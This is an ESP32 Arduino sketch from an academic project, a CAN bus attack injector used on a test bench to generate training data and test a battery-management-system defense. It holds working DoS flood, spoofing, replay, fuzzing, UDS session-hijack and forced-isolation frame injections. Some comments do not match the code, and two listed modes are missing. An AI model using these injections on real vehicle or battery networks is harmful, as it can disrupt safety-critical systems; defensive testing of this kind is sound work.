/*
 * attacker_node.ino
 * Attacker Node — CAN Bus Attack Injector for BMS Security Testing
 * Used to generate training dataset and validate 7-Layer defense
 *
 * WARNING: Use ONLY on test bench with isolated CAN network.
 *          Never connect to real vehicle CAN bus.
 *
 * Hardware: ESP32-WROOM-32D + SN65HVD230 CAN Transceiver
 * GCET EEE Department | 2026 | Academic Mini-Project
 */

#include <Arduino.h>
#include "driver/twai.h"

#define CAN_TX_PIN   GPIO_NUM_5
#define CAN_RX_PIN   GPIO_NUM_4
#define LOG_BAUD     115200

// ─────────────────────────────────────────────────────────────────────────────
// Attack Mode Selection (change to run different attacks)
// ─────────────────────────────────────────────────────────────────────────────
// 0 = Normal traffic only (training baseline)
// 1 = DoS Flood (high frequency same-ID messages)
// 2 = Voltage Spoof (fake 0x120 messages with wrong voltages)
// 3 = Replay Attack (re-send captured legitimate message)
// 4 = CAN Fuzzing (random ID + random payload)
// 5 = Mixed attack sequence (all types, cycling)
// 6 = UDS Session Hijack (0x27 SecurityAccess / 0x3E TesterPresent)
// 7 = Emergency SSR Cutoff Test (forcing S > 0.90)
// 8 = Battery Pack Theft & Cell-Bypass Tamper Injection
// 9 = Grid Peak Demand Stress Signal (0x198)
int ATTACK_MODE = 5;

// CAN setup
void setupCAN() {
  twai_general_config_t g = TWAI_GENERAL_CONFIG_DEFAULT(CAN_TX_PIN, CAN_RX_PIN, TWAI_MODE_NORMAL);
  twai_timing_config_t  t = TWAI_TIMING_CONFIG_500KBITS();
  twai_filter_config_t  f = TWAI_FILTER_CONFIG_ACCEPT_ALL();
  twai_driver_install(&g, &t, &f);
  twai_start();
}

void sendFrame(uint32_t id, const uint8_t *data, uint8_t len) {
  twai_message_t msg;
  msg.identifier = id;
  msg.extd = 0;
  msg.data_length_code = len;
  memcpy(msg.data, data, len);
  twai_transmit(&msg, pdMS_TO_TICKS(5));
}

// ─────────────────────────────────────────────────────────────────────────────
// ATTACK 1 — DoS Flood (0x000, high rate)
// ─────────────────────────────────────────────────────────────────────────────
void attack_dos_flood(int count) {
  uint8_t payload[8] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
  for (int i = 0; i < count; i++) {
    sendFrame(0x000, payload, 8);
    delayMicroseconds(500); // 2000 msg/s flood
  }
  Serial.printf("[ATTACK] DoS flood: %d frames sent\n", count);
}

// ─────────────────────────────────────────────────────────────────────────────
// ATTACK 2 — Voltage Spoofing (0x120, fake depleted cell voltage)
// ─────────────────────────────────────────────────────────────────────────────
void attack_voltage_spoof() {
  // Fake: Cell1 = 2.5V (danger low), Pack = 10.0V (fake depleted)
  uint8_t payload[8] = {
    0x09, 0xC4,  // SoC: 0x09C4 = 2500 → 25.00%  (fake low)
    0x27, 0x10,  // Voltage: 0x2710 = 10000 → 10.000V (fake depleted)
    0x00, 0x00,  // Current: 0A
    0x50,        // Anomaly: 80 (force high anomaly into system)
    0x01         // Action: REDUCE_CHARGE
  };
  sendFrame(0x180, payload, 8);
  Serial.println("[ATTACK] Voltage spoof: fake 25% SoC @ 10.0V sent");
}

// ─────────────────────────────────────────────────────────────────────────────
// ATTACK 3 — Replay Attack (re-send captured legitimate frame)
// ─────────────────────────────────────────────────────────────────────────────
void attack_replay() {
  // Pre-captured legitimate frame from healthy BMS
  uint8_t captured[8] = {
    0x1C, 0x20,  // SoC: 7200 → 72.00%
    0x39, 0x2C,  // Voltage: 14636 → 14.636V
    0x00, 0x96,  // Current: 150 → 0.150A
    0x02,        // Anomaly score: 2
    0x00         // Action: NORMAL
  };
  // Re-send 20 times rapidly (replay injection)
  for (int i = 0; i < 20; i++) {
    sendFrame(0x180, captured, 8);
    delay(2);
  }
  Serial.println("[ATTACK] Replay: captured frame sent 20x");
}

// ─────────────────────────────────────────────────────────────────────────────
// ATTACK 4 — CAN Fuzzing (random ID + random payload)
// ─────────────────────────────────────────────────────────────────────────────
void attack_fuzzing(int count) {
  uint8_t fuzz[8];
  for (int i = 0; i < count; i++) {
    uint32_t id = random(0x001, 0x7FF);
    for (int b = 0; b < 8; b++) fuzz[b] = (uint8_t)random(0, 256);
    sendFrame(id, fuzz, 8);
    delayMicroseconds(1000);
  }
  Serial.printf("[ATTACK] Fuzzing: %d random frames sent\n", count);
}

// ─────────────────────────────────────────────────────────────────────────────
// ATTACK 6 — UDS (ISO 14229) Session Hijack (0x7E0, unauthorized 0x27 / 0x3E)
// ─────────────────────────────────────────────────────────────────────────────
void attack_uds_hijack() {
  // Service 0x27 = SecurityAccess request seed
  uint8_t payload_sec[8] = {0x02, 0x27, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00};
  sendFrame(0x7E0, payload_sec, 8);
  delay(10);
  // Service 0x3E = TesterPresent keep-alive
  uint8_t payload_tp[8] = {0x02, 0x3E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
  sendFrame(0x7E0, payload_tp, 8);
  Serial.println("[ATTACK] UDS session hijack: unauthorized SecurityAccess 0x27 & TesterPresent 0x3E sent");
}

// ─────────────────────────────────────────────────────────────────────────────
// ATTACK 7 — High-Severity Emergency Injection (Forces score S > 0.90 for SSR trip test)
// ─────────────────────────────────────────────────────────────────────────────
void attack_high_severity_emergency() {
  uint8_t emergency_payload[8] = {
    0x00, 0x00,  // SoC 0%
    0x00, 0x00,  // Volts 0V
    0x7F, 0xFF,  // Extreme overcurrent spoof
    0x63,        // Anomaly score: 99 (0.99)
    0x04         // Action: ISOLATE_CELL_MODULE (SSR Cutoff Trip)
  };
  for (int i = 0; i < 10; i++) {
    sendFrame(0x180, emergency_payload, 8);
    delayMicroseconds(500);
  }
  Serial.println("[ATTACK] High-Severity Emergency Injection sent — testing SSR pack isolation");
}

// ─────────────────────────────────────────────────────────────────────────────
// NORMAL TRAFFIC (for dataset baseline)
// ─────────────────────────────────────────────────────────────────────────────
void send_normal_traffic() {
  uint8_t payload[8] = {
    0x1C, 0x20,  // SoC: 72%
    0x39, 0xCC,  // Voltage: 14.796V
    0x00, 0x96,  // Current: 0.15A
    0x02,        // Anomaly: 0.02 (clean)
    0x00         // Action: NORMAL
  };
  sendFrame(0x180, payload, 8);
}

// ─────────────────────────────────────────────────────────────────────────────
// SETUP & LOOP
// ─────────────────────────────────────────────────────────────────────────────
void setup() {
  Serial.begin(LOG_BAUD);
  Serial.println("=== BMS Attacker Node (TEST BENCH ONLY) ===");
  Serial.printf("Attack Mode: %d\n", ATTACK_MODE);
  setupCAN();
  randomSeed(esp_random());
}

int attack_cycle = 0;
uint32_t last_tx = 0;

void loop() {
  uint32_t now = millis();

  switch (ATTACK_MODE) {
    case 0: // Normal baseline traffic
      if (now - last_tx > 100) {
        send_normal_traffic();
        last_tx = now;
      }
      break;

    case 1: // DoS Flood
      attack_dos_flood(100);
      delay(50);
      break;

    case 2: // Voltage Spoof
      attack_voltage_spoof();
      delay(100);
      break;

    case 3: // Replay
      attack_replay();
      delay(500);
      break;

    case 4: // Fuzzing
      attack_fuzzing(50);
      delay(100);
      break;

    case 5: // Mixed cycling (changes every 5 seconds)
      if (now - last_tx > 5000) {
        attack_cycle = (attack_cycle + 1) % 7;
        last_tx = now;
        Serial.printf("[MIXED] Switching to attack %d\n", attack_cycle + 1);
      }
      switch (attack_cycle) {
        case 0: send_normal_traffic();           delay(100); break;
        case 1: attack_dos_flood(20);            delay(20);  break;
        case 2: attack_voltage_spoof();          delay(100); break;
        case 3: attack_replay();                  delay(100); break;
        case 4: attack_fuzzing(10);               delay(50);  break;
        case 5: attack_uds_hijack();              delay(100); break;
        case 6: attack_high_severity_emergency(); delay(100); break;
      }
      break;

    case 6: // UDS Session Hijack only
      attack_uds_hijack();
      delay(200);
      break;

    case 7: // High-Severity SSR Cutoff test only
      attack_high_severity_emergency();
      delay(500);
      break;
  }
}
